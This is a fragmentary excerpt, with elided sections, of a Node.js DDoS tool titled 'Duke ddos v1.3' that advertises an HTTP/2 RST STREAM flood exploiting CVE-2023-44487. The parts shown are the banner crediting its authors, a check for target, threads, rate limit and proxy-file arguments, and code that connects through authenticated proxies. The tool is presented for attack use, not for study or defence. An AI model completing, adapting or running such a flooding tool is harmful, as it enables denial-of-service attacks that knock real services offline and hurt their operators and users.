...
const targetDate = new Date('2026-02-30');
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    Duke ddos v1.3 Method With RST STREAM (CVE-2023-44487) // Updated: 31.01.2024 // With love @duke_ddos_l7
    Developers to method: @shiftwise - recoding method // @duke_ddos_l7 - improved to settings // @duke_ddos_l7 - system ai logic
    How to use & example:
...
function go() {
    ...
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        ...
        const proxyAuth = Buffer.from(`${proxyUser}:${proxyPass}`, 'utf8').toString('base64')
